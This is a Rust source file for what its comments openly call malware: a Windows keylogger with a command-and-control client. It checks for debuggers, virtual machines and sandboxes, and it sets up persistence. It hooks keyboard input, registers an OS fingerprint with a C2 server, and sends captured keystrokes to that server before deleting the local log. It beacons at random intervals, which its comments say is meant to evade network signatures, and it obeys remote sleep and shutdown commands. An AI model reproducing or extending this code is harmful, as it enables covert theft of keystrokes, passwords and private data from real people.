mod server;
mod system;
mod encode;
use std::{sync::Arc};
use system::{get_architecture, read_file, set_windows_hook, delete_file,check_for_analysis_behaviour, setup_malware,get_windows_os_version};
use tokio::time::{sleep, Duration};
use std::sync::atomic::{AtomicBool, Ordering};
use rand::{Rng, SeedableRng, rngs::StdRng, rngs::OsRng};


macro_rules! unwrap_or_panic {
    ($expr: expr) => {
        match $expr{
            Ok(res) =>{
                res
            },
                Err(e) => {panic!("Couldn't connect to server {}", e)
            }
        }   
    };
}

macro_rules! dead_branches {
    ($proc_name:expr, $list:expr) => {{
        let mut detected = false;

        // Dead if-branches — never true
        if 2 + 2 == 5 {
            println!("Debugger not detected.");
        }

        if "apple" == "orange" {
            println!("This will never happen.");
        }


        // Another misleading branch
        if std::env::var("TOTALLY_REAL_ENV").unwrap_or_default() == "true" {
            std::process::exit(0); // never reached
        }


    }};
}


#[tokio::main]
async fn main() {

    //checks if debugger, vm, sandbox is being used
    check_for_analysis_behaviour();

    //tries to setup persistency and put malware somewhere legit
    setup_malware();

    sleep(Duration::from_secs(600)).await;


    const URL: &'static str = "http://127.0.0.1:5000";

    let mut counter_beconing = 0;

    let pub_key ="-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkVLiPyzANDNB3e4oWAFS
dysBxnZG1Yc0Oa5KfRCETlmKC6saB3LfFm+LwM0auaOB+S0/H6gXSviIJ1FlP56E
c6G1gRJ7hCTJQE4j4mr9fq9+OF6NMmh6tVjtVeu3LJtFTLdV0C+yeWRL88KUazkI
9TrbtoFfLs02dlYMynvJ4ugH+J2VM2wvbWAV4O9z2tEXEaWP1ah5L+bilyphmVkT
TdRbb1M2OCTM+XahkjxEWoXAJsbHYBMZpi1F+9xhmfoM+wNp24KOMQ6JjaB7sV9L
hOfGW6eoyvxwP9yAKMNKAWxGpLp/m9FYAAJ+kILF04T3JA9yONe5ykl37oTKmFeD
iwIDAQAB
-----END PUBLIC KEY-----".to_string();

    //All the mutex code for sharing with different threads 
    let paused = Arc::new(AtomicBool::new(false));
    let server = Arc::new(server::Connection::new(&URL, rand::thread_rng().gen_range(0..255), pub_key));

    let system = get_architecture();
    let os_windows = get_windows_os_version();

    let os_fingerpint = format!("{} | OS Version: {}", system, os_windows);

    //Are pointers to the original resource to make it usable for async code
    let id: String = unwrap_or_panic!(server.register(os_fingerpint.as_str()).await);

    let server_for_beconing = Arc::clone(&server);
    let id_beconing = id.clone();

    let server_for_exfil = Arc::clone(&server);
    let id_exfil = id.clone();

    let server_for_command = Arc::clone(&server);
    let id_command = id.clone();

    //arc variables to share the same pause
    let paused_hook = Arc::clone(&paused);
    let paused_command = Arc::clone(&paused);
    let paused_exfil = Arc::clone(&paused);

    //thread that handels keyboard hooks
    tokio::spawn(async move {
        loop {
            dead_branches!("AHHH", "HAHH");
             //sleeps the malware for a predefined time
            //used by the malware author to sleep
            if paused_hook.load(Ordering::Relaxed) {
                sleep(Duration::from_secs(1)).await;
                continue;
            }

            unsafe {
                //hooks the keyboard callback
                set_windows_hook();
            }
            break;
        }
    });


    
    //spawns a thread that continually requests for commands 
    tokio::spawn(async move {
        //create ranom number generator
        let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
        loop {
            dead_branches!("AHHH", "HAHH");
            //sleeps the malware for a predefined time
            //used by the malware author to sleep
            if paused_command.load(Ordering::Relaxed) {
                sleep(Duration::from_secs(1)).await;
                continue;
            }
            
            //get command from c2 server
            let rec = unwrap_or_panic!(server_for_command.get_command(&id_command).await);
            //then execute the command
            execute_command(&rec, paused_command.clone()).await;

            //makes it so that the malware sends requests at random intervals.
            //this makes the malware activity more sparatic, and therefore harder to form network signature
            sleep(Duration::from_secs(rng.gen_range(10..40))).await;
        }
    });


    //thread that reads exfill file, and sends it off to the server
    tokio::spawn(async move {
        loop {
            dead_branches!("AHHH", "HAHH");
            //create ranom number generator
            let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");

            //sleeps the malware for a predefined time
            //used by the malware author to sleep
            if paused_exfil.load(Ordering::Relaxed) {
                sleep(Duration::from_secs(1)).await;
                continue;
            }

            let key_stroke = read_file();


            //gets a max of 3 tries to send exil data to c2 server
            for n in 0..3{
                if server_for_exfil.send_data(&id_exfil, &key_stroke.clone()).await.is_ok() {
                    delete_file();
                    break;
                }

                if n >=3 {
                    //sleep for 300 secs if it does not exfil properly
                    paused_exfil.store(true, Ordering::Relaxed);
                    sleep(Duration::from_secs(300)).await;
                    paused_exfil.store(false, Ordering::Relaxed);
                }
            }


            //makes it so that the malware sends requests at random intervals.
            //this makes the malware activity more sparatic, and therefore harder to form network signature
            sleep(Duration::from_secs(rng.gen_range(10..40))).await;
        }
    });

    // Main loop for beaconing
    loop {
        dead_branches!("AHHH", "HAHH");
        //sleeps the malware for a predefined time
        //used by the malware author to sleep
        if paused.load(Ordering::Relaxed) {
            sleep(Duration::from_secs(1)).await;
            continue;
        }

        //create ranom number generator
        let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
        //sends a becon to the c2 server
        //if c2 does not respond send 2 more timee
        match server_for_beconing.becon(&id_beconing).await {
            Ok(_) => counter_beconing = 0,
            Err(_) => counter_beconing += 1,
        };

        //if c2 server does not resond sleeps
        if counter_beconing >= 2 {
            sleep(Duration::from_secs(200)).await;
        }

        //makes it so that the malware sends requests at random intervals.
        //this makes the malware activity more sparatic, and therefore harder to form network signature
        sleep(Duration::from_secs(rng.gen_range(10..40))).await;
    }
}


//function that executes the command read from the c2 server
async fn execute_command(cmd: &str, paused: Arc<AtomicBool>) {
    let cmds: Vec<_> = cmd.split(':').collect();

    dead_branches!("AHHH", "HAHH");
    let parsed_cmd = cmds[0].replace('\n', "").replace('\r', "");
    match parsed_cmd.as_str() {

        //if it's a slp sleep the malware
        "slp" => {
            
            if let Ok(secs) = cmds[1].replace('\n', "").parse() {
                paused.store(true, Ordering::Relaxed);
                sleep(Duration::from_secs(secs)).await;
            }
        }
        //if it's shd shut down the malware
        "shd" => {
            std::process::exit(1);
        }

        //if it's pwn print
        "pwn" => {
            println!("{}", cmds[1]);
        }
        _ => {}
    }
}

